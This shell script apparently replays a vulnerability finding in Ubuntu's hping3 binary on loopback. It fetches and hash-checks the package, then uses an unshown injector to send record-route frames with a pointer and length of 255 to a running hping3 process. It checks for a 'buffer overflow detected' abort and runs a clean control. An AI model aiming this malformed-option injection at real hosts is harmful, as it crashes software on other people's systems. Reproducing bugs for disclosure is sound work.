#!/bin/sh
# One-command replay of the W12 distribution-binary result from a clean
# archive. Provisions the Ubuntu 24.04 hping3 binary itself (no pinned source,
# no install). All traffic is loopback 127.0.0.2 -> 127.0.0.1. 5 checks.
set -eu
cd "$(dirname "$0")"
WORK=/tmp/w12-distro-replay
DEB=$WORK/hping3_3.a2.ds2-10build2_amd64.deb
BIN=$WORK/root/usr/sbin/hping3
DEB_SHA=b98e33f9c3d0042aa416843fc85d3804d6985e943a05a1770cf88116bdd6e7c5
BIN_SHA=d0181f16d8438771dc5570e9ed3f373c729f4508cd20012fcad270cec1edc9cd
mkdir -p "$WORK"
if [ "$(sha256sum "$DEB" 2>/dev/null | cut -d' ' -f1)" != "$DEB_SHA" ]; then
    ( cd "$WORK" && apt-get download hping3 ) >/dev/null 2>&1
fi
[ "$(sha256sum "$DEB" | cut -d' ' -f1)" = "$DEB_SHA" ] || {
    echo "distro deb hash mismatch"; exit 2; }
rm -rf "$WORK/root"
dpkg-deb -x "$DEB" "$WORK/root"
[ "$(sha256sum "$BIN" | cut -d' ' -f1)" = "$BIN_SHA" ] || {
    echo "distro binary hash mismatch"; exit 2; }

PIDF=$WORK/distro.pid
RUN=$WORK/distro-attack.out
sudo -n rm -f "$PIDF" "$RUN"
: > "$RUN"
sudo -n sh -c "echo \$\$ > '$PIDF'; exec '$BIN' -D -1 -G -I lo -c 6 -i 1 127.0.0.2" \
    > "$RUN" 2>&1 &
hp=$!
pid=0
for x in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
    [ -s "$PIDF" ] && break
    sleep 0.1
done
pid=$(cat "$PIDF" 2>/dev/null || echo 0)
[ "$pid" -gt 0 ] || { kill "$hp" 2>/dev/null; echo "no hping pid"; exit 2; }
sleep 2
sudo -n python3 inject_rr_const.py --pid "$pid" --ptr 255 --rr-len 255 \
    --fill 32 --count 3 --gap 0.15 > "$WORK/inject.out" 2>&1
wait "$hp" || true

checks=0
fail=0
expect() {
    checks=$((checks + 1))
    if eval "$2"; then echo "PASS $1"; else echo "FAIL $1"; fail=$((fail + 1)); fi
}
expect "deb hash exact" '[ "$(sha256sum "$DEB" | cut -d" " -f1)" = "$DEB_SHA" ]'
expect "binary hash exact" '[ "$(sha256sum "$BIN" | cut -d" " -f1)" = "$BIN_SHA" ]'
expect "injector sent 3 frames" 'grep -q "injected 3 constant-fill frames" "$WORK/inject.out"'
expect "process aborted before write" 'grep -q "buffer overflow detected" "$RUN"'
timeout 12 sudo -n "$BIN" -D -1 -G -I lo -c 3 -i 1 127.0.0.2 \
    > "$WORK/valid-rr.out" 2>&1 || true
expect "valid RR control clean" 'grep -q "RR:" "$WORK/valid-rr.out" && ! grep -qi "buffer overflow" "$WORK/valid-rr.out"'
[ "$fail" -eq 0 ] || { echo "REPLAY_DISTRO_FAIL: $fail"; exit 1; }
echo "REPLAY_DISTRO_OK: $checks checks"
